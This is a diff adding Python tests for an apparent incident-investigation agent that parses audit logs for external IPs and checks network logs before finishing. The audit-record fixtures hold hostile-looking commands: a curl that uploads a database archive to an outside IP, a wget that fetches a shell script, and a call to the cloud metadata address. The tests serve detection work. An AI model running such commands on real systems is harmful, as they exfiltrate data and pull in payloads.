@@ -561,3 +561,33 @@ def test_confidence_sum_has_no_float_drift():
     state.current_confidence = 0.6
     state.update_confidence(0.25, "s", "r")
     assert state.current_confidence == 0.85 and not state.current_confidence < 0.85
+
+
+def test_command_external_ips_keep_only_public_addresses():
+    from agent.tools.real.fetch_audit_log import command_external_ips
+    records = [
+        {"user": "ubuntu", "exec_args": "curl -T /tmp/db.tar.gz http://185.220.101.47/upload"},
+        {"user": "ubuntu", "exec_args": "wget http://185.220.101.47/a.sh -O /tmp/a.sh"},
+        {"user": "ubuntu", "exec_args": "ssh 10.0.7.12 && ping 127.0.0.1 && curl 169.254.169.254/latest"},
+        {"user": "root", "exec_args": "sshd -o AuthorizedKeysCommand 3.3.3.3"},  # EC2 Instance Connect 제외
+        {"user": "ubuntu", "exec_args": "echo 1.2.3.4.5 999.1.1.1"},  # IP가 아닌 숫자열
+    ]
+    assert command_external_ips(records) == ["185.220.101.47"]
+
+
+def test_command_external_ip_must_be_checked_on_network_before_termination():
+    """로컬 유출 변형(로그인 IP ≠ 전송 목적지): audit의 외부 IP를 network로 조회해야 종료가 승인된다."""
+    check = {"rule": "audit_post_exploitation", "web_server_exec": 0, "web_server_suspicious": 0,
+             "suspicious": 1, "examples": [], "external_ips": ["185.220.101.47"]}
+    audit = lambda _args: {"count": 3, "summary": "audit", "records": [], "window_total": 3, "rule_checks": [check]}
+    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_audit_log": audit})
+    network_again = {"next_action": "call_tool", "tool_call": {"tool_name": "fetch_network_log", "args": {
+        "host": "web-01", "start_time": "a", "end_time": "b", "ip": "185.220.101.47"}}}
+    done = _terminate("confidence_sufficient", 0.9)
+    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), done, network_again, done])
+    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
+        {**SEED, "confidence_initial": 0.9})
+    assert any("185.220.101.47" in n and "network 기록을 확인하지 않음" in n for n in result["investigation_notes"])
+    network_ips = [t["input"].get("ip") for t in result["tools_called"] if t["tool_name"] == "fetch_network_log"]
+    assert "185.220.101.47" in network_ips
+    assert result["statistics"]["termination_reason"] == "confidence_sufficient"
